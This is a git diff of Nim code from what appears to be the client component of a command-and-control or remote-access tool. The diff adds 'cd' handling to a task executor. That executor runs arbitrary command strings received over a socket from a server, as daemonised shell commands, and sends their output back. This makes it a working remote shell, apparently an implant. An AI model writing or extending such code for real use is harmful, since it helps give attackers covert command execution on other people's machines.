@@ -3,7 +3,7 @@ when defined(server):
   import ../server/[types, communication]
 
 when defined(client):
-  import osproc, os, net
+  import osproc, os, net, strutils
   import ../client/communication
 
 when defined(server):
@@ -13,6 +13,12 @@ when defined(server):
 when defined(client):
   proc executeTask*(socket: Socket, taskId: int, toExec: string) =
     try:
+      let cmdSplit = toExec.split(" ") 
+      if cmdSplit[0] == "cd":
+        let newPath = cmdSplit[1..(cmdSplit.len() - 1)].join(" ")
+        setCurrentDir(newPath)
+        socket.sendOutput(taskId, "SHELL", "changed current working directory to " & newPath)
+        return
       let (output, _) = execCmdEx(toExec, workingDir = getCurrentDir(), options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
       socket.sendOutput(taskId, "SHELL", output)
     except OSError:
